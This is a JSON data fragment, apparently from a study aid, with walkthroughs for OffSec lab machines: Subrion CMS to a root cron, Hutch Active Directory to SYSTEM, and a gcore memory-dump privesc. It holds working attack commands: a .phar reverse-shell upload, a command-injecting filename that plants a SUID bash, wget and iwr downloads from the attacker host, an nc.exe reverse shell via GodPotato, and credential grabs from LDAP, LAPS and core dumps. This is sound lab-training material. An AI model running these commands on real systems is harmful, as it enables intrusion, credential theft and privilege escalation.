      "v": "find / -perm -u=s -type f 2>/dev/null"
     },
     {
      "t": "out",
      "v": "/usr/bin/gcore  <-- SUID, abnormal"
     },
     {
      "t": "warn",
      "v": "**If this doesn't match:** on most runs gcore isn't SUID. Instead `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/gcore` for charles. Then use `sudo gcore <PID>` in the next step."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo -l"
     }
    ]
   },
   {
    "h": "Root via a memory dump",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ps -ef | grep -i -E 'root|screen|backup'    # pick a root PID, e.g. 812\ncd /tmp\ngcore 812\nstrings core.812 | grep -i -E 'pass|pwd|root'"
     },
     {
      "t": "out",
      "v": "... password=<secret> ..."
     },
     {
      "t": "p",
      "v": "Write-ups usually find the secret in a root process called **password-store**. Dump that PID first."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "su root        # enter the recovered password\ncat /root/proof.txt"
     },
     {
      "t": "warn",
      "v": "The exact PID and secret vary: dump each root PID and run `strings` on it."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 **2181 + 8080** means ZooKeeper with Exhibitor.",
   "💥 A field that becomes a startup script means RCE.",
   "🧪 An odd SUID or sudo binary (`gcore`) is your privesc: check **GTFOBins**."
  ]
 },
 "pgp-exfiltrated": {
  "title": "Linux · Subrion CMS → root cron",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.66"
  },
  "steps": [
   {
    "h": "Recon and the vhost",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 22,80 -Pn {T}"
     },
     {
      "t": "p",
      "v": "It redirects to `exfiltrated.offsec`, so add it to /etc/hosts:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "echo '{T} exfiltrated.offsec' | sudo tee -a /etc/hosts"
     }
    ]
   },
   {
    "h": "Subrion admin → upload a shell",
    "b": [
     {
      "t": "p",
      "v": "The panel is at `/panel/`. Log in with **admin:admin**. Version **4.2.1** has CVE-2018-19422: `.php` is blocked, so use **.phar**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/webshells/php/php-reverse-shell.php shell.phar   # set ip={K} port=80"
     },
     {
      "t": "p",
      "v": "Upload it in **Panel → Uploads**, then:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80\ncurl http://exfiltrated.offsec/uploads/shell.phar"
     },
     {
      "t": "out",
      "v": "uid=33(www-data)"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: call back on port **80**."
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc: find the root cron",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "wget http://{K}/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy"
     },
     {
      "t": "out",
      "v": "UID=0 ... /opt/image-exif.sh"
     },
     {
      "t": "p",
      "v": "It runs as root on images that get uploaded."
     }
    ]
   },
   {
    "h": "Root",
    "b": [
     {
      "t": "p",
      "v": "Your notes: a malicious filename."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cd <dir the script watches>\ntouch '$(cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash).jpg'\n# wait for the cron, then:\n/tmp/rootbash -p\ncat /root/proof.txt"
     },
     {
      "t": "warn",
      "v": "**If this doesn't match:** most write-ups show `/opt/image-exif.sh` running **exiftool** on the images in the Subrion uploads folder. That's **CVE-2021-22204** (exiftool before 12.24): a crafted **DjVu** image runs a command as root. Make one with a public CVE-2021-22204 PoC, drop it in the uploads folder, and wait for the cron. Check the script with `cat /opt/image-exif.sh` and the version with `exiftool -ver`."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🌐 A redirect means adding the name to `/etc/hosts`.",
   "🔑 admin:admin plus an upload CVE; `.phar` gets past a `.php` block.",
   "🕵️ **pspy** finds hidden root crons.",
   "💥 Anything a root script reads from a folder you can write to (a filename, an image) is an injection point."
  ]
 },
 "pgp-hutch": {
  "title": "Windows AD · LDAP password → WinRM → SYSTEM",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.122"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "The domain is **hutch.offsec**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 -Pn {T}"
     },
     {
      "t": "p",
      "v": "🎯 It's a Domain Controller with **WinRM (5985)** open."
     }
    ]
   },
   {
    "h": "Anonymous LDAP",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ldapsearch -x -H ldap://{T} -b \"DC=hutch,DC=offsec\" \"(objectClass=user)\" | grep -i -E \"description|info|sAMAccountName\""
     },
     {
      "t": "out",
      "v": "sAMAccountName: fmcsorley\ndescription: CrabSharkJellyfish192"
     },
     {
      "t": "p",
      "v": "🔑 The password is in the **description** field."
     }
    ]
   },
   {
    "h": "Validate the creds and get a shell",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nxc winrm {T} -u fmcsorley -p 'CrabSharkJellyfish192'      # Pwn3d!\nevil-winrm -i {T} -u fmcsorley -p 'CrabSharkJellyfish192'"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type ..\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc to SYSTEM",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami /priv"
     },
     {
      "t": "out",
      "v": "SeImpersonatePrivilege Enabled"
     },
     {
      "t": "p",
      "v": "On Kali, host GodPotato and nc.exe:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "In evil-winrm:"
     },
     {
      "t": "code",
      "lang": "powershell",
      "v": "iwr http://{K}/GodPotato-NET4.exe -o C:\\Windows\\Temp\\gp.exe\niwr http://{K}/nc.exe -o C:\\Windows\\Temp\\nc.exe\nC:\\Windows\\Temp\\gp.exe -cmd \"C:\\Windows\\Temp\\nc.exe {K} 443 -e cmd.exe\""
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 443"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: serve on **80**, catch on **443**."
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "If this doesn't match: read the LAPS password",
   "b": [
    {
     "t": "p",
     "v": "Most write-ups of Hutch don't show SeImpersonate for fmcsorley. The usual route: **LAPS** is set up and fmcsorley can read the Administrator password."
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "ldapsearch -x -H ldap://{T} -D 'hutch\\fmcsorley' -w 'CrabSharkJellyfish192' -b 'DC=hutch,DC=offsec' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd"
    },
    {
     "t": "out",
     "v": "ms-Mcs-AdmPwd: <the Administrator password>"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "evil-winrm -i {T} -u administrator -p '<password from above>'"
    }
   ]
  },
  "takeaways": [
   "🏢 On a DC, try an **anonymous LDAP bind** and read `description` and `info`.",
   "✅ Validate creds with `nxc` before anything else.",
   "🎟️ `whoami /priv` showing SeImpersonate means GodPotato or PrintSpoofer.",
   "🔐 A domain user with LAPS read rights means the local admin password.",
   "📦 Keep those binaries **offline**."
  ]
 }
};
